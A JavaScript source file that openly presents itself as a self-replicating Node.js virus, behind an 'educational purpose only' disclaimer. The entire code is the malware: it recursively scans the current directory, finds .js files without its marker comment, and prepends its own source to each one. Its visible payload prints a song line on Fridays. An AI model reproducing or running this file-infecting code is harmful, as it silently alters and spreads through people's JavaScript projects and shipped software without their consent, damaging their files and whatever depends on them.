// #virus.js
// the line above will be used for marking a file as infected

/*
* Program created for entertainment and educational purpose only
* WARNING: EXECUTE THIS FILE AT YOUR OWN RISK :WARNING
*/

// this mild-mannered virus leaves the global namespace alone and creates its own closure
(function() {

  // the virus payload - it sings a song on Fridays
  var day = new Date().getDay();
  if (day == 5) { console.log("It's Friday! Friday!"); }

  // we will need the fs module to find files and infect them
  var fs = require('fs');
  // helper module
  var path = require('path');

  var marker_signature = '// #virus.js';
  var marker_length = marker_signature.length;
  // the infection payload == content of this file
  var infection_payload = fs.readFileSync(__filename);

  // where to look for files to infect
  var target_path = './';

  // start infecting .js file
  var files = fs.readdirSync(target_path);
  // pass these files to the infection function
  infect_files(files);


  /**
  * Function for infecting .js files
  *
  * @param {Array} files
  */

  function infect_files(files) {

    files.forEach(function(file) {

      var stat = fs.statSync(file);

      // if it's a direcrory, get the files and run them through the infection process
      if (stat.isDirectory()) {
        // don't bother hidden directories
        if (file[0] != '.') {
          // infect the files after retirieving them their directories
          infect_files(get_files(file));
        }
      }

      // if it is a file, validate the file for infection 'eligibility'
      else if (stat.isFile()) {
        
        // don't bother hidden files
        if (file[0] != '.') {

          // we are interested only in .js files
          if (path.extname(file) == '.js') {

            // don't bother with self
            if (path.basename(__filename) != file) {

              // bother only if file is not already infected
              var fd = fs.openSync(file, 'r');
              var marker = fs.readSync(fd, marker_length);
              // be kind, rewind
              fs.closeSync(fd);

              var signature = marker[0];
              if (marker_signature != signature) {

                // original content
                var original_content = fs.readFileSync(file);
                // prepare infection
                var infected_content = infection_payload + '\n' + original_content;
                // infect file
                //console.log('Infecting: ' + file);
                fs.writeFileSync(file, infected_content);
              }
            }
          }
        }
      }

    });
  }

  /**
  * Function for getting the files from a directory with their full paths
  *
  * @param {String} dir
  */

  function get_files(dir) {

    // readdirSync will only give the names of the files, we need to get the full path
    var _files = fs.readdirSync(dir);
    // array for storing the files with their full path
    var files = [];

    // fill up the files array
    _files.forEach(function(file) {
      var full_path = dir + '/' + file;
      files.push(full_path);
    });

    // return the files to whatever called this function
    return files;
  }

})();
